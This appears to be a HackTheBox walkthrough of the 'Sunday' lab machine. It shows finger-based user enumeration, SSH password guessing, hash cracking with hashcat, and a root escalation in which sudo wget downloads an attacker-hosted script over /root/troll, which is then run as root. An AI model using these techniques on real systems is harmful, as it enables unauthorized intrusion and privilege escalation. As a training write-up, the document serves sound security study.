# Sunday — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

Enumerating the deprecated `finger` service reveals the exact names of active local users (`sammy` and `sunny`) → Password guessing yields SSH credentials for `sunny:sunday` → `sudo -l` reveals `sunny` can run `/root/troll` as root without a password → A backup file contains a hash for the `sammy` account, which we crack offline (`sammy:cooldude!`) → Accessing SSH as `sammy`, `sudo -l` reveals the ability to run `wget` as root → We host a bash script on our attacking machine and use `sudo wget` to overwrite `/root/troll`, executing the script as `root` to gain privileges.

---

## Enumeration

Full nmap scan:

```bash
nmap -sC -sV -p- -n -Pn --min-rate=1024 10.10.10.76
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 79 | finger | |
| 111 | rpcbind | 2-4 (RPC #100000) |
| 515 | printer | |
| 6787 | HTTP | Apache httpd |
| 22022| SSH | OpenSSH 8.4 |

The target machine is running several unusual services, including an Apache web server on an obscure port (6787) and SSH on port 22022. 
The most critical finding from the Nmap scan is the presence of the `finger` daemon on port 79. `finger` is an ancient networking protocol used to retrieve user information from a remote machine.

---

## Exploitation — Finger Enumeration & Credential Guessing

Because the `finger` service is active without restrictions, we can use it to enumerate valid user accounts on the Linux machine. Instead of throwing a generic list against SSH, we can determine the exact usernames.

We use a tool like `finger-user-enum.pl` (by pentestmonkey) and a wordlist of common names:

```bash
perl finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 10.10.10.76 
```

The script queries the machine and identifies two distinct, non-standard user accounts with recent SSH login entries:
- `sammy`
- `sunny`

With valid usernames confirmed, we attempt basic password guessing against the SSH service running on port 22022. Knowing the name of the machine is "Sunday", we use it as a candidate password.

The guess succeeds for the `sunny` account:
`sunny : sunday`

We authenticate via SSH:
```bash
ssh -p 22022 sunny@10.10.10.76
```

We now have an initial foothold as `sunny`.

---

## Privilege Escalation — Multi-stage Sudo Abuse (Wget)

Our first local enumeration step is checking `sudo -l` for the `sunny` user:

```bash
sudo -l
```

The output indicates that `sunny` can run the following file as `root` without a password:
`/root/troll`

We run the file (`sudo /root/troll`), but it simply outputs a troll message and exits. We do not have write permissions to modify the file directly as the `sunny` user.

During local enumeration, we discover a backup file (`shadow.backup` or similar) containing a password hash for the `sammy` user. 

We extract the hash and pass it to Hashcat on our attacking machine (Mode 7400 for sha256crypt):

```bash
hashcat -m 7400 pass.hash /usr/share/wordlists/rockyou.txt --force
```

The hash cracks successfully: `sammy : cooldude!`.

We change users to `sammy` using `su` or establishing a new SSH session. 
We perform `sudo -l` for `sammy`:

```bash
sudo -l
```

The `sammy` user has different permissions: they can run the `/usr/bin/wget` command as `root` without a password.

`wget` allows downloading files. Since we can run it as root, we can download a file from an attacker-controlled server and instruct `wget` to save it anywhere on the file system, thereby overwriting any existing file. 

We recall that the `sunny` user can execute `/root/troll` as root. If we use `sammy`'s `wget` capability to overwrite `/root/troll` with a malicious script, `sunny` can then execute it!

On our attacking machine, we create a script named `temp.sh` containing a bash shell invocation:

```bash
cat << 'EOF' > temp.sh
#!/bin/bash
bash
EOF
```

We host this file using a Python HTTP server (`python3 -m http.server 80`).

On the target machine, acting as `sammy`, we use `sudo wget` to fetch the script and overwrite the troll program:

```bash
sudo /usr/bin/wget http://10.10.14.32/temp.sh -O /root/troll
```

Finally, we switch back to the `sunny` user. We execute the newly overwritten script via sudo:

```bash
sudo /root/troll
```

Because `/root/troll` now consists of `#!/bin/bash \n bash`, executing it spawns an interactive shell with root privileges.

We are `root`. 🎉

---

## Key Takeaways

- **Legacy Service Risks:** Deploying deprecated services like `finger` fundamentally defeats the security layer of unknown usernames, guaranteeing attackers can construct perfectly tailored brute-force lists.
- **Sudo File Overwrites:** Sudo privileges on commands that allow writing output files (like `wget -O`, `tar`, `zip`, `dd`, or `tee`) are functionally equivalent to having full root file system write access. 

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*